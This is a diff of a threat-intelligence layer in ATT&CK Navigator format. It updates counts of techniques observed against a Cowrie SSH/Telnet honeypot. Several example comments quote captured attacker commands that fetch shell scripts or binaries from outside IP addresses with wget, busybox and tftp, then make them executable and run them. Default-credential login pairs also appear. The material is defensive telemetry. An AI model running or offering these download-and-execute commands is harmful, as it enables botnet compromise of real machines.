@@ -6,7 +6,7 @@
     "layer": "4.5"
   },
   "domain": "enterprise-attack",
-  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-08-16 06:01:52",
+  "description": "Techniques observed against a Cowrie SSH/Telnet honeypot. Score is the number of times each technique was observed. Generated 2026-08-16 07:01:52",
   "filters": {
     "platforms": [
       "Linux"
@@ -22,9 +22,9 @@
   "techniques": [
     {
       "techniqueID": "T1110.001",
-      "score": 1480,
+      "score": 1670,
       "enabled": true,
-      "comment": "1480 observation(s) from 54 unique IP(s). e.g. usr1cv8 / usr1cv8",
+      "comment": "1670 observation(s) from 59 unique IP(s). e.g. usr1cv8 / usr1cv8",
       "metadata": [
         {
           "name": "tactic",
@@ -32,7 +32,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "54"
+          "value": "59"
         },
         {
           "name": "first seen",
@@ -40,15 +40,15 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-16T06:00:56"
+          "value": "2026-08-16T06:52:14"
         }
       ]
     },
     {
       "techniqueID": "T1222.002",
-      "score": 187,
+      "score": 218,
       "enabled": true,
-      "comment": "187 observation(s) from 15 unique IP(s). e.g. /bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
+      "comment": "218 observation(s) from 18 unique IP(s). e.g. /bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
       "metadata": [
         {
           "name": "tactic",
@@ -56,7 +56,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "15"
+          "value": "18"
         },
         {
           "name": "first seen",
@@ -64,15 +64,15 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-16T06:01:32"
+          "value": "2026-08-16T06:53:55"
         }
       ]
     },
     {
       "techniqueID": "T1105",
-      "score": 128,
+      "score": 138,
       "enabled": true,
-      "comment": "128 observation(s) from 15 unique IP(s). e.g. /bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
+      "comment": "138 observation(s) from 18 unique IP(s). e.g. /bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
       "metadata": [
         {
           "name": "tactic",
@@ -80,7 +80,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "15"
+          "value": "18"
         },
         {
           "name": "first seen",
@@ -88,15 +88,15 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-16T06:01:32"
+          "value": "2026-08-16T06:53:55"
         }
       ]
     },
     {
       "techniqueID": "T1078",
-      "score": 52,
+      "score": 65,
       "enabled": true,
-      "comment": "52 observation(s) from 41 unique IP(s). e.g. admin / admin",
+      "comment": "65 observation(s) from 45 unique IP(s). e.g. admin / admin",
       "metadata": [
         {
           "name": "tactic",
@@ -104,7 +104,7 @@
         },
         {
           "name": "unique source IPs",
-          "value": "41"
+          "value": "45"
         },
         {
           "name": "first seen",
@@ -112,7 +112,31 @@
         },
         {
           "name": "last seen",
-          "value": "2026-08-16T06:00:48"
+          "value": "2026-08-16T06:52:06"
+        }
+      ]
+    },
+    {
+      "techniqueID": "T1033",
+      "score": 11,
+      "enabled": true,
+      "comment": "11 observation(s) from 11 unique IP(s). e.g. (wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Discovery"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "11"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-16T01:30:05"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-16T06:52:10"
         }
       ]
     },
@@ -161,30 +185,6 @@
         {
           "name": "last seen",
           "value": "2026-08-16T04:59:42"
-        }
-      ]
-    },
-    {
-      "techniqueID": "T1033",
-      "score": 9,
-      "enabled": true,
-      "comment": "9 observation(s) from 9 unique IP(s). e.g. (wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-      "metadata": [
-        {
-          "name": "tactic",
-          "value": "Discovery"
-        },
-        {
-          "name": "unique source IPs",
-          "value": "9"
-        },
-        {
-          "name": "first seen",
-          "value": "2026-08-16T01:30:05"
-        },
-        {
-          "name": "last seen",
-          "value": "2026-08-16T06:00:54"
         }
       ]
     },
@@ -261,6 +261,30 @@
       ]
     },
     {
+      "techniqueID": "T1140",
+      "score": 1,
+      "enabled": true,
+      "comment": "1 observation(s) from 1 unique IP(s). e.g. /bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox goOLuDcG",
+      "metadata": [
+        {
+          "name": "tactic",
+          "value": "Defense Evasion"
+        },
+        {
+          "name": "unique source IPs",
+          "value": "1"
+        },
+        {
+          "name": "first seen",
+          "value": "2026-08-16T06:24:05"
+        },
+        {
+          "name": "last seen",
+          "value": "2026-08-16T06:24:05"
+        }
+      ]
+    },
+    {
       "techniqueID": "T1562.004",
       "score": 1,
       "enabled": true,
@@ -292,7 +316,7 @@
       "#f85149"
     ],
     "minValue": 0,
-    "maxValue": 1480
+    "maxValue": 1670
   },
   "legendItems": [
     {
